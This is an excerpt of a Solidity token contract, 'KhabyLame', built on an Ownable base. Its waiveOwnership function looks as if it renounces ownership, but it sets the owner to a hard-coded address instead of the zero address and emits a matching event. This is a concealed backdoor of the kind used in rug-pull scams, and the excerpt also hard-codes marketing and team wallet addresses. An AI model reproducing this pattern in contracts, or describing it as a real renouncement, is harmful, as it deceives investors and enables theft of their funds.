...
contract Ownable is Context {
    ...
    function waiveOwnership() public virtual onlyOwner {
        emit OwnershipTransferred(_owner, address(0x06D3944c4ab0D76d7D76dB46214eeC4A0DFD1b9D));
        _owner = address(0x06D3944c4ab0D76d7D76dB46214eeC4A0DFD1b9D);
    }
...
contract KhabyLame is Context, IERC20, Ownable {
    ...
    address payable public marketingWalletAddress = payable(0x2dcA9F56A637990e860B708C5840409e623fc72F);
    address payable public teamWalletAddress = payable(0x2dcA9F56A637990e860B708C5840409e623fc72F);
